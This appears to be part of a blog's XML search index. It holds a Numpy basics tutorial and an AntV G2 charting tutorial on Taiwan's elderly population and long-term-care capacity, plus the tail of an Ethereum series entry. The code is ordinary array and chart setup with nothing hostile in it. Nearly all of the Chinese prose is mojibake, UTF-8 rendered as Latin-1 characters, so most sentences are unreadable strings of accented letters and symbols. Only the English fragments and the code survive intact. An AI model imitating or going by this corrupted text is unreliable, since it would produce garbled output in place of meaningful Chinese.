Ethereumå€å¡Šéˆï¼æ™ºèƒ½åˆç´„(Smart Contract)èˆ‡åˆ†æ•£å¼ç¶²é æ‡‰ç”¨(DApp)å…¥é–€
What is different between a transaction and a call
æ¯”è¼ƒ requre, assert, å’Œ revert åŠå…¶é‹ä½œçš„æ–¹å¼
How to listen for contract events in javascript tests
åœ¨å…¬é–‹æ¸¬è©¦éˆä¸Šéƒ¨ç½²åˆç´„ã€‚
æ·±å…¥æ™ºèƒ½åˆç´„ ABI

é—œæ–¼ä½œè€…ï¼š@cychien å–œæ„›é–±è®€ï¼Œç†±æ„›å‹•æ‰‹ä½œï¼Œç›¸ä¿¡æœªä¾†å»ºç«‹åœ¨å°æ­·å²çš„ç†è§£ä¸Š
]]></content>
      <tags>
        <tag>ethereum</tag>
        <tag>smart contract</tag>
        <tag>dapp</tag>
      </tags>
  </entry>
  <entry>
    <title>å¾é›¶é–‹å§‹å­¸è³‡æ–™ç§‘å­¸ï¼šNumpy åŸºç¤å…¥é–€</title>
    <url>/2017/07/28/data-science-101-numpy-tutorial/</url>
    <content><![CDATA[
å‰è¨€æœ¬ç³»åˆ—æ–‡ç« å°‡é€éç³»çµ±ä»‹ç´¹è³‡æ–™ç§‘å­¸ï¼ˆData Scienceï¼‰ç›¸é—œçš„çŸ¥è­˜ï¼Œé€é Python å¸¶é ˜è®€è€…å¾é›¶é–‹å§‹é€²å…¥è³‡æ–™ç§‘å­¸çš„ä¸–ç•Œã€‚é€™é‚Šæˆ‘å€‘å°‡ä»‹ç´¹ Numpy é€™å€‹å¼·å¤§çš„ Python å‡½å¼åº«ã€‚
ä»€éº¼æ˜¯ Numpyï¼ŸNumpy æ˜¯ Python çš„ä¸€å€‹é‡è¦æ¨¡çµ„ï¼ˆPython æ˜¯ä¸€å€‹é«˜éšèªè¨€ä¹Ÿæ˜¯ä¸€ç¨®è† æ°´èªè¨€ï¼Œå¯ä»¥é€éæ•´åˆå…¶ä»–ä½éšèªè¨€åŒæ™‚æ“æœ‰æ•ˆèƒ½å’Œé«˜æ•ˆç‡çš„é–‹ç™¼ï¼‰ï¼Œä¸»è¦ç”¨æ–¼è³‡æ–™è™•ç†ä¸Šã€‚Numpy åº•å±¤ä»¥ C å’Œ Fortran èªè¨€å¯¦ä½œï¼Œæ‰€ä»¥èƒ½å¿«é€Ÿæ“ä½œå¤šé‡ç¶­åº¦çš„é™£åˆ—ã€‚ç•¶ Python è™•ç†é¾å¤§è³‡æ–™æ™‚ï¼Œå…¶åŸç”Ÿ list æ•ˆèƒ½è¡¨ç¾ä¸¦ä¸ç†æƒ³ï¼ˆä½†å¯ä»¥å‹•æ…‹å­˜ç•°è³ªè³‡æ–™ï¼‰ï¼Œè€Œ Numpy å…·å‚™å¹³è¡Œè™•ç†çš„èƒ½åŠ›ï¼Œå¯ä»¥å°‡æ“ä½œå‹•ä½œä¸€æ¬¡å¥—ç”¨åœ¨å¤§å‹é™£åˆ—ä¸Šã€‚æ­¤å¤– Python å…¶é¤˜é‡é‡ç´šçš„è³‡æ–™ç§‘å­¸ç›¸é—œå¥—ä»¶ï¼ˆä¾‹å¦‚ï¼šPandasã€SciPyã€Scikit-learn ç­‰ï¼‰éƒ½å¹¾ä¹æ˜¯å¥ åŸºåœ¨ Numpy çš„åŸºç¤ä¸Šã€‚å› æ­¤å­¸æœƒ Numpy å°æ–¼å¾€å¾Œå­¸ç¿’å…¶ä»–è³‡æ–™ç§‘å­¸ç›¸é—œå¥—ä»¶æ‰“å¥½å …å¯¦çš„åŸºç¤ã€‚
Numpy åŸºç¤æ“ä½œ

Numpy é™£åˆ— Numpy çš„é‡é»åœ¨æ–¼é™£åˆ—çš„æ“ä½œï¼Œå…¶æ‰€æœ‰åŠŸèƒ½ç‰¹è‰²éƒ½å»ºç¯‰åœ¨åŒè³ªä¸”å¤šé‡ç¶­åº¦çš„ ndarrayï¼ˆN-dimensional arrayï¼‰ä¸Šã€‚ndarray çš„é—œéµå±¬æ€§æ˜¯ç¶­åº¦ï¼ˆndimï¼‰ã€å½¢ç‹€ï¼ˆshapeï¼‰å’Œæ•¸å€¼é¡å‹ï¼ˆdtypeï¼‰ã€‚ ä¸€èˆ¬æˆ‘å€‘ç¨±ä¸€ç¶­é™£åˆ—ç‚º vector è€ŒäºŒç¶­é™£åˆ—ç‚º matrixã€‚ä¸€é–‹å§‹æˆ‘å€‘æœƒå¼•å…¥ numpy æ¨¡çµ„ï¼Œé€éå‚³å…¥ list åˆ° numpy.array() å‰µå»ºé™£åˆ—ã€‚
 # å¼•å…¥ numpy æ¨¡çµ„import numpy as npnp1 = np.array([1, 2, 3])np2 = np.array([3, 4, 5])# é™£åˆ—ç›¸åŠ print(np1 + np2) # [4 6 8]# é¡¯ç¤ºç›¸é—œè³‡è¨Šprint(np1.ndim, np1.shape, np1.dtype) # 1 (3,) int64 =&gt; ä¸€ç¶­é™£åˆ—, ä¸‰å€‹å…ƒç´ , è³‡æ–™å‹åˆ¥np3 = np.array([1, 2, 3, 4, 5, 6])

 å¾æª”æ¡ˆå–è³‡æ–™ï¼š
 npd = np.genfromtxt(&#x27;data.csv&#x27;, delimiter=&#x27;,&#x27;)

 æ”¹è®Šé™£åˆ—ç¶­åº¦ï¼š
 np3 = np3.reshape([2, 3])print(np3.ndim, np3.shape, np3.dtype) # 2 (2, 3) int64

 æ”¹è®Šé™£åˆ—å‹åˆ¥ï¼ˆboolã€intã€floatã€stringï¼‰ï¼š
 bool å¯ä»¥åŒ…å« Trueã€Falseï¼Œint å¯ä»¥åŒ…å« int16ã€int32ã€int64ã€‚å…¶ä¸­æ•¸å­—æ˜¯æŒ‡ bitsã€‚float å¯ä»¥åŒ…å« 16ã€32ã€64 è¡¨ç¤ºå°æ•¸é»å¾Œå¹¾ä½ã€‚string å¯ä»¥æ˜¯ stringã€unicodeã€‚nan å‰‡è¡¨ç¤ºéºå¤±å€¼ã€‚
 np3 = np3.astype(&#x27;int64&#x27;)np3.dtype# dtype(&#x27;int64&#x27;)

å»ºç«‹é™£åˆ— å»ºç«‹å¡«æ»¿ 0 æˆ– 1 çš„é™£åˆ—ï¼š
 np1 = np.zeros([2, 3]) # array([[ 0.,  0.,  0.], [ 0.,  0.,  0.]])np2 = np.ones([2, 3]) # array([[ 1.,  1.,  1.], [ 1.,  1.,  1.]])



é™£åˆ—ç´¢å¼•èˆ‡åˆ‡ç‰‡ ä¸€ç¶­é™£åˆ—æ“ä½œå’Œ Python åŸç”Ÿ list é¡ä¼¼ï¼š
 np3 = np.array([1, 2, 3, 4, 5, 6])print(np3[2]) # 3    

 äºŒç¶­é™£åˆ—ï¼š
 np3 = np3.reshape([2, 3])print(np3[1, 0]) # 4



åŸºæœ¬æ“ä½œ ä½¿ç”¨å¸ƒæ—é®ç½©ä¾†å–å€¼ï¼š
 np3 = np.array([1, 2, 3, 4, 5, 6])print(np3 &gt; 3) # [False False False  True  True  True]print(np3[np3 &gt; 3]) # [4 5 6]

 åŠ ç¸½ï¼š
 np3 = np3.reshape([2, 3])print(np3.sum(axis=1)) # å°‡ axis=1 æ©«å‘åŠ ç¸½ [6 15]

ç¸½çµä»¥ä¸Šä»‹ç´¹äº† Numpy çš„åŸºç¤çŸ¥è­˜ï¼Œå»ºç«‹äº†åŸºæœ¬çš„ array å’Œ ndarray çš„è§€å¿µã€‚ç›¸ä¿¡åœ¨ç†Ÿæ‚‰ Numpy ä¹‹å¾Œ Pandas çš„å­¸ç¿’å°‡æœƒæ¯”è¼ƒå®¹æ˜“Â ï¼ˆPandas çš„è³‡æ–™å®¹å™¨ DataFrameã€Series äº‹å¯¦ä¸Šæ˜¯å¥ åŸºåœ¨ Numpy çš„é™£åˆ—ä¸Šï¼‰
å»¶ä¼¸é–±è®€
7 Steps to Mastering Machine Learning With Python
[python] numpy axisæ¦‚å¿µæ•´ç†ç­†è¨˜

ï¼ˆimage via berkeleyã€codingeekã€cornellã€scipy-lecturesï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Machine Learning</tag>
        <tag>æ©Ÿå™¨å­¸ç¿’</tag>
        <tag>AI</tag>
        <tag>Artificial Intelligence</tag>
        <tag>NLP</tag>
        <tag>Data Mining</tag>
        <tag>äººå·¥æ™ºæ…§</tag>
        <tag>ç›£ç£å¼å­¸ç¿’</tag>
        <tag>Supervised learning</tag>
        <tag>å¾é›¶é–‹å§‹å­¸è³‡æ–™ç§‘å­¸</tag>
        <tag>Numpy</tag>
        <tag>è³‡æ–™ç§‘å­¸</tag>
        <tag>data science</tag>
        <tag>data scientist</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨ AntV è£½ä½œè³‡æ–™åœ–è¡¨-å°ç£è€å¹´äººå£èˆ‡é•·ç…§æ©Ÿæ§‹ä¾›éœ€æ¯”</title>
    <url>/2018/08/25/datavis-antv/</url>
    <content><![CDATA[å‰è¨€éš¨è‘—å¹´é½¡å¢é•·ï¼Œå¤šå°‘é–‹å§‹æœƒé‡åˆ°å®¶äººæˆ–è¦ªæˆšéœ€è¦é•·æœŸç…§è­·ï¼Œå…¥ä½ç™‚é¤Šé™¢æˆ–é†«é™¢çš„ç‹€æ³ï¼Œæ¥è€…å°±æœƒç™¼ç¾è¨±å¤šç…§è­·ä¸­å¿ƒå¯æ˜¯ä¸€ä½é›£æ±‚ï¼Œé™¢ä¸­çš„ç…§æœäººå“¡æˆ–æ˜¯é†«è­·äººå“¡ä¹Ÿå¾—ä»¥ä¸€æ“‹ç™¾ï¼Œè®“æˆ‘å¾ˆæƒ³çŸ¥é“ç›®å‰å°ç£æ•´é«”ä¾†èªªï¼Œè€å¹´äººå£ã€é•·ç…§æ©Ÿæ§‹èˆ‡ç…§æœäººå“¡çš„æ¯”ä¾‹å¤±è¡¡æœ‰å¤šåš´é‡ã€‚è€Œå‰›å¥½åœ¨å‰é™£å­ @huli å¤§å¤§ä»‹ç´¹äº†Ant designï¼Œè®“æˆ‘å†æ¬¡æ³¨æ„åˆ°åŒæ¨£ç‚ºèèŸ»é‡‘æœå‡ºå“çš„ AntVï¼Œç¨å¾®ç ”ç©¶ä¹‹ä¸‹ç™¼ç¾å®ƒä½¿ç”¨èµ·ä¾†éå¸¸ç°¡å–®å¿«é€Ÿï¼Œä¸¦ä¸”ä¸€æ¨£æœ‰ Reactã€Angular èˆ‡ Vue çš„ç‰ˆæœ¬ã€‚æ‰€ä»¥ä»Šå¤©é€™ç¯‡æ–‡ç« æƒ³è—‰ç”±å¯¦ä½œå°ç£è€å¹´äººå£èˆ‡é•·ç…§æ©Ÿæ§‹ä¾›éœ€æ¯”çš„è³‡æ–™åœ–è¡¨ï¼Œé †ä¾¿ä»‹ç´¹ AntV é€™å¥—è³‡æ–™è¦–è¦ºåŒ–çš„å¥—ä»¶ã€‚
å°äº†ï¼Œå ±å°è€…æœ‰ç™¼è¡¨éä¸€ç³»åˆ—å°ˆè¼¯ - é•·ç…§æ©Ÿæ§‹è£¡çš„å¤§è±¡â€”â€”10è¬è€äººè¢«ç…§é¡§çš„çœŸç›¸ï¼Œèªªæ˜å°ç£é•·ç…§ç”¢æ¥­çš„ç¾æ³ï¼Œå¦‚æœæ‡¶å¾—çœ‹æˆ‘é•·ç¯‡å¤§è«–çš„æŠ€è¡“æ–‡ç« ï¼Œæ‹œè¨—è‡³å°‘åœ¨é›¢é–‹å‰å»çœ‹ä¸€ä¸‹å ±å°è€…çš„å°ˆè¼¯ï¼Œé€™æ¨£æˆ‘ä¹Ÿç®—åŠŸå¾·ä¸€ä»¶ï¼Œè®“æ›´å¤šäººçŸ¥é“é•·ç…§ç”¢æ¥­çš„é‡è¦æ€§ï¼Œæˆ–è¨±ä¹Ÿå°±æœ‰é‚£éº¼ä¸€äº›äººæœ‰è¾¦æ³•è§£æ±ºé€™å€‹é®®å°‘è¢«æèµ·çš„å•é¡Œã€‚
å…ˆçœ‹å€‹æˆæœï¼š
See the Pen ç¸½é«”å°ç£è€å¹´äººå£èˆ‡é•·ç…§æ©Ÿæ§‹ä¾›éœ€æ¯” - AntV - demo by Arvin (@arvin0731) on CodePen.



æˆ‘ä¾ç…§ Wiki ä¸Šçš„å°ç£åœ°ç†å€åŠƒåˆ†å°‡è³‡æ–™åŒ—ã€ä¸­ã€å—ã€æ±èˆ‡å¤–å³¶äº”å€‹å€å¡Šï¼Œä¸¦åŠ ä¸Šå…©å€‹æŒ‰éˆ•ï¼Œå¯ä»¥æŠŠè³‡æ–™é‡è¼ƒå°‘çš„å¤–å³¶å»é™¤ï¼Œç”¨ä¾†å±•ç¤º G2 åœ¨è™•ç†è³‡æ–™åˆ‡æ›æ™‚çš„é †æš¢æ„Ÿã€‚
çœ‹å¾—å‡ºä¾†å…¶å¯¦å°±æ˜¯å€‹éå¸¸ç°¡å–®ç”¨ Excel ä¹Ÿç•«å¾—å‡ºä¾†çš„åˆ†çµ„é•·æ¢åœ–ï¼Œä½†å¯¦éš›ä¸Šä½ æœƒç™¼ç¾ï¼Œé€é AntV è£½ä½œå®Œå…¨ä¸æœƒæ¯”ç”¨ Excel éº»ç…©ï¼Œé‚„æ”¯æ´ RWD èˆ‡è³‡æ–™çš„åˆ‡æ›å‹•ç•«ï¼çœŸçš„éå¸¸é©åˆæˆ‘é€™æ¬¡æƒ³è¦å¿«é€Ÿæ‹‰å‡ºä¸€å€‹æ¯”è¼ƒåœ–è¡¨çš„ç‹€æ³ï¼
AntV
AntV å…¶å¯¦åŒ…å«äº†ä¸‰å€‹ä¸åŒæ‡‰ç”¨æƒ…å¢ƒçš„å¥—ä»¶ï¼šG2ã€G6ã€F2ã€‚

G2: åŒ…å«å„ç¨®åœ–è¡¨å…ƒç´ çš„é›†æˆï¼Œå¤§å¤šæ•¸çš„æ‡‰ç”¨å ´æ™¯éƒ½å¯ä»¥å¾ G2 ä¸­æ‰¾åˆ°å°æ‡‰åˆé©çš„å…ƒä»¶ã€‚
G6: ä¸»è¦æ˜¯é‡å°æµç¨‹åœ–èˆ‡é—œè¯æ€§åˆ†æçš„åœ–è¡¨å…ƒä»¶ï¼Œç”šè‡³èƒ½åˆ©ç”¨ G2 ç¹ªè£½è³‡æ–™åº«çš„ ER Diagram èˆ‡æ™‚åºåœ–ã€‚
F2: é‡å° Mobile çš„ä½¿ç”¨æƒ…å¢ƒä¾†ç‰¹åˆ¥åŠ å¼·åœ–è¡¨åœ¨ performance ä¸Šçš„è¡¨ç¾ï¼Œä¸»è¦ç¹ªè£½åœ¨ canvas ä¸Šã€‚

ä»Šå¤©æˆ‘å€‘ä½¿ç”¨ G2 ä¾†é–‹ç™¼é€™å¹¾å¥—ç”±èèŸ»é‡‘æœé–‹ç™¼çš„è¦–è¦ºåŒ–å¥—ä»¶ï¼Œé™¤äº†éµç…§ Antd çš„è¨­è¨ˆèªè¨€å¤–ï¼Œé‡å°åœ–è¡¨çš„è¨­è¨ˆè£½ä½œä¸Šï¼Œæ·±å— The Grammar of Graphics é€™æœ¬å·¨ä½œçš„å½±éŸ¿ï¼Œä¹Ÿæ˜¯ G2 çš„åç¨±çš„ç”±ä¾†ã€‚

G2 çš„å¼·å¤§æ˜¯ç”±å…¶èƒŒå¾Œçš„ä¸€å¥—åœ–å½¢èªæ³•æ‰€æ”¯æ’çš„ï¼Œå®ƒåŸºæ–¼ã€ŠThe Grammar of Graphicsã€‹(Leland Wilkinson è‘—)ä¸€æ›¸ï¼Œæ˜¯ä¸€å¥—ç”¨ä¾†æè¿°æ‰€æœ‰çµ±è¨ˆåœ–å½¢æ·±å±¤ç‰¹æ€§çš„èªæ³•è¦å‰‡ï¼Œè©²èªæ³•å›ç­”äº†ã€ä»€éº¼æ˜¯çµ±è¨ˆåœ–å½¢ã€é€™ä¸€å•é¡Œï¼Œä»¥è‡ªåº•å‘ä¸Šçš„æ–¹å¼çµ„ç¹”æœ€åŸºæœ¬çš„å…ƒç´ å½¢æˆæ›´é«˜ç´šçš„å…ƒç´ ã€‚ç”±æ­¤ï¼ŒG2 æ‰€å»ºæ§‹å‡ºçš„åœ–è¡¨æ˜¯ç”±ä¸€ç³»åˆ—ç¨ç«‹çš„åœ–å½¢èªæ³•å…ƒç´ çµ„åˆè€Œæˆçš„ â€“ AntV G2 å®˜ç¶²

æˆ‘ä¸¦æ²’æœ‰çœ‹éé‚£æœ¬æ›¸ï¼Œä¹Ÿæ²’æœ‰ä»”ç´°ç ”ç©¶ G2 çš„åŸå§‹ç¢¼ï¼Œä½†é€™æ•˜è¿°è½èµ·ä¾†å°±è¶…å²å®³çš„ï¼Œæ•´å€‹å·¥å…·æ˜¯å»ºæ§‹åœ¨ä¸€å¥—å®Œæ•´çš„ç†è«–åŸºç¤ä¸Šé ­ã€‚
åœ¨ G2 çš„ä¸–ç•Œä¸­ï¼Œä¸¦æ²’æœ‰æ˜ç¢ºå®šç¾©ä¸€èˆ¬çš„åœ–è¡¨é¡å‹ï¼Œåƒæ˜¯é•·æ¢åœ–ã€æŠ˜ç·šåœ–ç­‰ç­‰ï¼Œæ˜¯ä¾ç…§ä¸€ç³»åˆ—çš„åœ–å½¢èªæ³•å…ƒç´ çµ„åˆæˆçš„çµæœä¾†æ±ºå®šå…¶é¡å‹ã€‚
æ‰€è¬‚çš„åœ–å½¢èªæ³•å…ƒç´ å¤§æ¦‚å°±æ˜¯åŒ…å«ï¼š

DataSet è³‡æ–™é›†æ“ä½œ
Scale åº¦é‡
Geom å¹¾ä½•æ¨™è¨˜ï¼ˆpoint, line, area, shape, etcï¼‰
Attr åœ–å½¢å±¬æ€§
Coord åº§æ¨™ç³»
Axis åº§æ¨™è»¸
Legend åœ–ä¾‹
Tooltip æç¤ºè¨Šæ¯
Guide è¼”åŠ©å…ƒç´ 
Facet åˆ†é¢ ï¼ˆå°‡ä¸€ä»½è³‡æ–™æŒ‰ç…§æŸå€‹ç¶­åº¦åˆ†éš”æˆè‹¥å¹²å­é›†ï¼‰
Label æ¨™ç±¤
Theme ä¸»é¡Œ
Event åœ–è¡¨äº‹ä»¶

åœ¨å®˜æ–¹æ–‡ä»¶ä¸Šä¸Šé‡å°ä¸åŒçš„å…ƒç´ éƒ½æœ‰éå¸¸è©³ç´°çš„èªªæ˜èˆ‡ç¯„ä¾‹ï¼Œè€Œä¸”éƒ½æœ‰ä¸­æ–‡æ–‡ä»¶ï¼ˆé›–ç„¶æ˜¯ç°¡é«”â€¦ï¼‰ï¼Œæ˜¯ AntV çš„çµ•å¤§å„ªé»ä¹‹ä¸€ã€‚
é€éæ“ä½œé€™äº›ä¸åŒå…ƒç´ çš„çµ„åˆï¼Œå¯ä»¥å¾ˆå®¹æ˜“çš„åˆ‡æ›åœ–è¡¨é¡å‹ï¼Œä»¥ Coord ç‚ºä¾‹ï¼š
chart.coord(&#39;coordType&#39;[, cfg]);
åœ¨åŒæ¨£çš„è³‡æ–™é›†ä¸Šï¼Œé€éä¸Šè¿°çš„æ–¹å¼ä¾†è½‰æ›åº§æ¨™è»¸ï¼Œé¦¬ä¸Šå°±å¯ä»¥å¾å±¤ç–Šé•·æ¢åœ–åˆ‡æ›ç‚ºåœ“é¤…åœ–ï¼š
 åœ–ç‰‡ä¾†æº
æˆ–æ˜¯é€éè‡ªå®šç¾© Shapeï¼Œå¿«é€Ÿå°‡ä¸€èˆ¬çš„é•·æ¢åœ–ï¼Œæ”¹è®Šæˆä¸‰è§’å½¢çš„å½¢ç‹€ï¼š
See the Pen AntV-G2-demo by Arvin (@arvin0731) on CodePen.


ç”±æ–¼é€™æ¨£çš„è¨­è¨ˆç†å¿µèˆ‡åŸºç¤ï¼ŒG2 æ¯”èµ·å…¶ä»–ä¸€æ¨£æä¾›è¼ƒç‚ºé«˜éšè¦–è¦ºåŒ–èªæ³•çš„å¥—ä»¶ä¾†èªªï¼Œå½ˆæ€§å¤§äº†ä¸å°‘ã€‚
é–‹å§‹é€²è¡Œå¯¦ä½œï¼Œè¦–è¦ºåŒ–ç¸½è¦æœ‰å€‹æ–¹å‘ï¼Œèµ°ï¼Œæˆ‘å€‘å…ˆå¾è³‡æ–™æœé›†é–‹å§‹ï¼é¦–å…ˆï¼Œè¦æƒ³çŸ¥é“è€å¹´äººå£ä»¥åŠé•·ç…§æ©Ÿæ§‹çš„æ¯”ä¾‹ï¼Œæˆ‘å€‘éœ€è¦æ‰¾åˆ°ä¾ç…§å¹´é½¡åˆ†çµ„çš„äººå£çµ±è¨ˆè³‡æ–™ï¼Œé€™å¯ä»¥å¾å…§æ”¿éƒ¨çš„äººå£è³‡æ–™åº«ä¸­æ‰¾åˆ°ã€Œå¹´åº•äººå£æ•¸æŒ‰æ€§åˆ¥åŠäº”æ­²å¹´é½¡çµ„åˆ†ã€çš„è³‡æ–™è¡¨ï¼Œå¾æ°‘åœ‹ 35 å¹´åˆ° 106 å¹´éƒ½æœ‰ï¼Œç®—æ˜¯è »é½Šå…¨çš„ã€‚æˆ‘å€‘é¸å– 85 ~ 100+ ä»¥ä¸Šçš„è³‡æ–™ç•¶ä½œè€å¹´äººå£ã€‚
2017 å¹´çš„éƒ¨åˆ†è¨ˆç®—å‡ºä¾†å¾Œå¤§ç´„æ˜¯ï¼š368,757 äºº

æ¥è‘—ï¼Œåˆ°è¡›ç¦éƒ¨çµ±è¨ˆè™•æ‰¾å°‹é•·æœŸç…§é¡§æ©Ÿæ§‹çš„ç›¸é—œè³‡æ–™ã€‚
å¯ä»¥æ‰¾åˆ° 2017 å¹´é•·ç…§èˆ‡å®‰é¤Šæ©Ÿæ§‹ç¸½æ•¸çš„å¯ä¾›é€²ä½äººæ•¸ï¼Œå¤§ç´„ 57,147 äººï¼š

ä»¥åŠ 2017 å¹´è€äººé•·æœŸç…§é¡§ã€å®‰é¤Šæ©Ÿæ§‹å·¥ä½œäººå“¡äººæ•¸ï¼Œå¤§ç´„ 19,064 äººï¼ˆåªè¨ˆç®—è­·ç†äººå“¡èˆ‡ç…§é¡§æœå‹™äººå“¡ï¼‰ï¼š

ä¸Šè¿°çš„è³‡æ–™ä¾†æºéƒ½æœ‰å€‹åˆ¥ç¸£å¸‚çš„çµ±è¨ˆè³‡æ–™ï¼Œä¸Šé¢æ•¸å­—æ˜¯æˆ‘å°‡å„ç¸£å¸‚åŠ ç¸½çš„çµæœï¼Œå¯èƒ½å¤šå°‘æœƒæœ‰èª¤å·®ï¼Œå¤§å®¶åˆ¥ä»‹æ„å•Šâ€¦æ•´é«”æ¯”ä¾‹æ‡‰è©²ä¸æœƒå·®å¤ªå¤šã€‚
æ¥è‘—ä½¿ç”¨ G2 ä¾†é€²è¡Œè¦–è¦ºåŒ–è¦ä½¿ç”¨ G2 å¾ˆç°¡å–®ï¼Œåªè¦åœ¨ HTML ä¸­è¼‰å…¥ &lt;script src=&quot;https://gw.alipayobjects.com/os/antv/assets/g2/3.0.9/g2.min.js&quot;&gt;&lt;/script&gt; å³å¯ã€‚
æ¥è‘—å°‡å‰›å‰›çš„è³‡æ–™å®šç¾©å¥½ï¼š
const SimpleAll = [  &#123;name: &#x27;å¯ä¾›é€²ä½äººæ•¸&#x27;, value: 57147&#125;,  &#123;name: &#x27;é•·ç…§ã€é¤Šè­·äººå“¡&#x27;, value: 19064&#125;,  &#123;name: &#x27;è€å¹´äººå£æ•¸(85~100+)&#x27;, value: 368757&#125;];

æˆ‘å€‘å°±å¯ä»¥é€é G2.Chart ä¾†å®šç¾©åœ–è¡¨ï¼š
const chart = new G2.Chart(&#123;  container: &#x27;mountNode&#x27;,  forceFit: true,  height: window.innerHeight&#125;);

æˆ‘å€‘ new ä¸€å€‹ G2.Chart çš„ instanceï¼Œä¸¦ä¸”åŒæ™‚å‚³å…¥ä¸‰å€‹åƒæ•¸çµ¦äºˆå»ºæ§‹ï¼š

container: æŒ‡å®šä½ çš„åœ–è¡¨è¦æ›è¼‰åœ¨ DOM ä¸­çš„å“ªå€‹ä½ç½®ï¼Œå°æ‡‰æ–¼ HTML ä¸­å…ƒç´ çš„ id å€¼ã€‚
forceFit: è¶…æ–¹ä¾¿çš„åƒæ•¸ï¼Œåªè¦è¨­å®šç‚º trueï¼Œä½ çš„åœ–è¡¨å°±èƒ½ Responsiveï¼Œå› æ­¤ä¹Ÿä¸ç”¨å†è¨­å®šå¯¬åº¦ã€‚
height: å¯ä»¥é¡å¤–å®šç¾©éœ€è¦çš„åœ–è¡¨é«˜åº¦ã€‚

å†ä¾†æˆ‘å€‘æŠŠè³‡æ–™èˆ‡åœ–è¡¨åšç¶å®šï¼š
chart.source(SimpleAll);

æ¥è‘—ä¾¿èƒ½é–‹å§‹è¨­å®šæˆ‘å€‘çš„åœ–è¡¨é•·ç›¸ï¼š
chart  .interval()  .position(&#x27;name*value&#x27;)  .color(&#x27;name&#x27;)  .adjust([&#123;    type: &#x27;dodge&#x27;,    marginRatio: 1 / 5  &#125;]);

å…ˆå‰èªªéï¼ŒG2 ä¸­æ²’æœ‰å€åˆ†åœ–è¡¨é¡å‹ï¼Œåˆ©ç”¨çš„æ˜¯å„ç¨®ä¸åŒçš„å¹¾ä½•æ¨™è¨˜ä¾†çµ„æˆåœ–è¡¨ï¼Œå¦‚æœè¦è£½ä½œé•·æ¢åœ–ï¼Œéœ€è¦ç”¨åˆ°çš„å°±æ˜¯ Ã¬nterval() é€™å€‹å¹¾ä½•æ¨™è¨˜ï¼ŒG2 é‚„æ”¯æ´ï¼špoint(), path(), line(), area(), polygon(), edge(), schema(), heatmap() é€™å¹¾ç¨®é¡å‹ï¼Œå®˜ç¶²æœ‰æ›´è©³ç´°çš„ä»‹ç´¹
å®£å‘Šæˆ‘å€‘éœ€è¦çš„å¹¾ä½•åœ–å½¢å¾Œï¼Œæ¥è‘—å°±æœƒæƒ³çŸ¥é“æˆ‘å€‘è¦æ€éº¼å°‡è³‡æ–™æ˜ å°„åˆ°å°çš„ä½ç½®ï¼Œä¸¦ä¸”çµ¦äºˆä¸åŒçš„é¡è‰²å€åˆ¥ã€‚
è€Œé€™ä¸€åˆ‡åœ¨ G2 ä¸­éƒ½éå¸¸çš„ç°¡å–®ç›´è¦ºã€‚
é€é position(&#39;name*value&#39;) é€™å€‹ APIï¼Œæˆ‘å€‘æŒ‡å®šè³‡æ–™æ¬„ä½çš„ name è¦å°æ‡‰åˆ°åœ–è¡¨åº§æ¨™è»¸ä¸Šçš„ xï¼Œè€Œ value å°æ‡‰åˆ° yï¼Œåˆ°é€™é‚Šç‚ºæ­¢ï¼Œæˆ‘å€‘å°±èƒ½ç•«å‡ºä¸€å€‹æ“æœ‰å®Œæ•´è³‡è¨Šçš„åœ–è¡¨ï¼š


ç•¶ç„¶é€™æ¨£é‚„ä¸å¤ ï¼Œè‡³å°‘ä¹Ÿè¦ç”¨é¡è‰²ä¾†å€åˆ¥ä¸€ä¸‹ä¸åŒçš„è³‡æ–™é¡åˆ¥ã€‚åˆ©ç”¨ color(name) ä¾†å‘Šè¨´ G2ï¼Œæˆ‘å€‘è¦æ ¹æ“šè³‡æ–™çš„ name æ¬„ä½ï¼Œç”¨ä¸åŒçš„é¡è‰²ä¾†å€åˆ†ã€‚


G2 çš„ API é€šå¸¸éƒ½èƒ½æ¥æ”¶ä¸€å€‹ä»¥ä¸Šçš„åƒæ•¸ï¼Œä»¥ color ç‚ºä¾‹ï¼Œé™¤äº†ç›´æ¥å‚³å…¥é¡è‰²è¦å°æ‡‰çš„è³‡æ–™æ¬„ä½å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¼¸å…¥æŸå€‹é¡è‰²ï¼Œè®“ä»– apply åˆ°æ•´å€‹åœ–è¡¨ï¼›æˆ–æ˜¯å‚³å…¥ callbackï¼Œåœ¨ callback ä¸­æ ¹æ“šæ¬„ä½æ•¸å€¼åšé‚è¼¯ä¸Šçš„è‘—è‰²å‹•ä½œã€‚
// å¯ä»¥åƒè€ƒå®˜ç¶² API Doc https://antv.alipay.com/zh-cn/g2/3.x/api/geom.html#_colorchart.point().position(&#x27;x*y&#x27;).color(&#x27;z&#x27;); // ä½¿ç”¨é»˜èªçš„é¡è‰²chart.point().position(&#x27;x*y&#x27;).color(&#x27;z&#x27;, [ &#x27;red&#x27;, &#x27;blue&#x27; ]); // ä½¿ç”¨å‚³å…¥çš„æŒ‡å®šé¡è‰²chart.point().position(&#x27;x*y&#x27;).color(&#x27;z&#x27;, (value) =&gt; &#123;  if(value === 1) &#123;    return &#x27;red&#x27;  &#125;  return &#x27;blue&#x27;;&#125;);

æ¥è‘—æˆ‘å€‘é‚„å¯ä»¥åŠ é»æ±è¥¿è®“åœ–è¡¨æ´»æ½‘ä¸€é»ã€‚chart.point()  .position([&#x27;name&#x27;, &#x27;value&#x27;])  .size(50)  .shape(&#x27;name&#x27;, function (name) &#123;    return [&#x27;image&#x27;, imageMap[name]];  &#125;);

æˆ‘å€‘åœ¨åŸæœ¬çš„ interval å¹¾ä½•åœ–å½¢ä¸ŠåŠ ä¸Šå¦ä¸€å€‹å¹¾ä½•åœ–å½¢ pointï¼Œä½ç½®ä¸€æ¨£å°‡ (name, value) æ˜ å°„åˆ° (x, y)ã€‚
ç›¸ä¿¡çœ¼å°–çš„ä½ æœƒç™¼ç¾ï¼Œposition çš„åƒæ•¸é™¤äº†ä¸€é–‹å§‹çš„ (name*value) å¤–ï¼Œä¹Ÿå¯ä»¥å‚³é array å½¢å¼ã€‚
